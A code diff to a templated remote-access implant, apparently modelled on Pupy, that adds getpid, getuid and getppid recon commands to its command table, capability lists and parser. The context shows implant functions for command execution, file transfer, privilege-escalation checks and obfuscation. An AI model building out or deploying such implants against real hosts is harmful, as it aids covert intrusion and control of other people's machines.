@@ -641,6 +641,9 @@ def _action_bind() -> None:
     table["env"] = lambda task: mod_env()
     table["date"] = lambda task: mod_date()
     table["alive"] = lambda task: mod_alive()
+    table["getpid"] = lambda task: mod_getpid()
+    table["getuid"] = lambda task: mod_getuid()
+    table["getppid"] = lambda task: mod_getppid()
 {% else %}
     table["ping"] = lambda task: {"pong": True, "id": AGENT_ID}
 {% endif %}
@@ -715,7 +718,8 @@ _OBF = _NoopObf()
 # Unconditional: the plaintext TCP ListenerClient path needs it regardless of
 # the obfuscation level.
 CAPABILITIES = [
-    {% if include_recon %}"sysinfo", "network", "processes", "netstat", "process_kill", "pwd", "get_hwuuid", "env", "date", "alive",{% endif %}
+    {% if include_recon %}"sysinfo", "network", "processes", "netstat", "process_kill", "pwd", "get_hwuuid", "env", "date", "alive",
+                    "getpid", "getuid", "getppid",{% endif %}
     {% if include_exec %}"exec",{% endif %}
     {% if include_fs %}"fs_list", "fs_get", "fs_put",{% endif %}
     {% if include_privesc %}"privesc_check", "privesc_suggest",{% endif %}
@@ -1608,6 +1612,53 @@ def mod_alive():
     return {"alive": True, "id": AGENT_ID}
 
 
+def mod_getpid():
+    """The agent process's own pid.
+
+    Upstream Pupy's ``getpid``. Reported so an operator can correlate the
+    implant against the host's own process list -- and so a migration can be
+    confirmed by watching the pid change.
+    """
+    try:
+        return {"pid": _o.getpid()}
+    except Exception as exc:
+        return {"error": f"cannot read the pid: {exc}"}
+
+
+def mod_getuid():
+    """The identity the agent is running as.
+
+    Upstream Pupy's ``getuid``. On POSIX that is the euid and its passwd entry;
+    on Windows the uid concept does not exist, so the account name is what
+    answers the same question.
+    """
+    try:
+        if _pf.system().lower().startswith("win"):
+            import getpass
+            return {"user": getpass.getuser() or ""}
+        import pwd  # POSIX-only
+        euid = _o.geteuid()
+        try:
+            entry = pwd.getpwuid(euid)
+            return {"user": entry.pw_name, "uid": euid, "gid": entry.pw_gid}
+        except KeyError:
+            return {"user": str(euid), "uid": euid}
+    except Exception as exc:
+        return {"error": f"cannot read the identity: {exc}"}
+
+
+def mod_getppid():
+    """The pid of the agent's parent.
+
+    Upstream Pupy's ``getppid``. Useful for spotting the launcher: a parent of
+    explorer.exe is not the same finding as a parent of services.exe.
+    """
+    try:
+        return {"ppid": _o.getppid()}
+    except Exception as exc:
+        return {"error": f"cannot read the parent pid: {exc}"}
+
+
 def mod_netstat():
     """Established connections, as the host itself sees them.
 
@@ -2306,7 +2357,8 @@ def _register(transport) -> tuple:
         "capabilities": [
             {% if include_exec %}"exec",{% endif %}
             "ping", "shutdown",
-            {% if include_recon %}"sysinfo", "network", "processes", "netstat", "process_kill", "pwd", "get_hwuuid", "env", "date", "alive",{% endif %}
+            {% if include_recon %}"sysinfo", "network", "processes", "netstat", "process_kill", "pwd", "get_hwuuid", "env", "date", "alive",
+                    "getpid", "getuid", "getppid",{% endif %}
 
             {% if include_fs %}"fs_list", "fs_get", "fs_put",{% endif %}
             {% if include_privesc %}"privesc_check", "privesc_suggest",{% endif %}
@@ -2432,7 +2484,7 @@ def _parse_command(text: str) -> dict:
     verb, _, rest = text.partition(" ")
     v, arg = verb.lower(), text[len(verb):].strip()
     if v in ("sysinfo", "network", "netstat", "pwd", "get_hwuuid", "env",
-             "date", "alive",
+             "date", "alive", "getpid", "getuid", "getppid",
              "privesc_check", "privesc_suggest", "ping"):
         return {"action": v}
     if v in ("ps", "processes"):
